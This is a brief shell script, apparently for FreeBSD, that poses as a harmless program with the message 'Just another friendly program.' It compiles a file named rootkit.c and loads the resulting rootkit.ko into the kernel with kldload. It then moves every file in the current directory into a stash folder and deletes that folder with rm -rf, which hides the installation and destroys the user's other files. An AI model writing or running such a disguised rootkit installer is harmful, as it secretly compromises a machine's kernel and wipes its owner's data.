#!/bin/sh

dir_name="stash"

echo "Just another friendly program."

mkdir $dir_name
mv *.sh $dir_name
mv *.h $dir_name
mv Makefile $dir_name
mv rootkit.c $dir_name
cd $dir_name
make
kldload ./rootkit.ko
cd ..
mv * "$dir_name"
rm -rf "$dir_name"
